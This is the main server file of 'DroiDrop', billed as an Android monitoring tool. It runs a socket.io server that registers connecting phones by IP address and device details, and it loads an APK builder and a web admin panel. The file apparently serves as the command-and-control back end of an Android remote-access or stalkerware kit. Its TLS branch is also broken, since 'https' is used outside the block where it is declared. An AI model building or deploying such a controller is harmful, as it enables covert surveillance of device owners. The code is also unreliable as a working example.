/* 
*   DroiDrop
*   An Android Monitoring Tool
*   By VoidTyphoon.co.uk
*/


const
    express = require('express'),
    app = express(),
    { Server } = require("socket.io"),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// spin up secure socket server
const serverOptions = {
    pingInterval: 30000,
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
};

if (CONST.security.tls_enabled) {
    const https = require('https');
    const fs = require('fs');
    serverOptions.https = {
        key: fs.readFileSync(CONST.security.key_path),
        cert: fs.readFileSync(CONST.security.cert_path)
    };
}

const io = new Server(CONST.security.tls_enabled ? 
    https.createServer(serverOptions.https) : CONST.control_port, 
    serverOptions
);

io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo: {},
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});


// get the admin interface online
app.listen(CONST.web_port);

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));
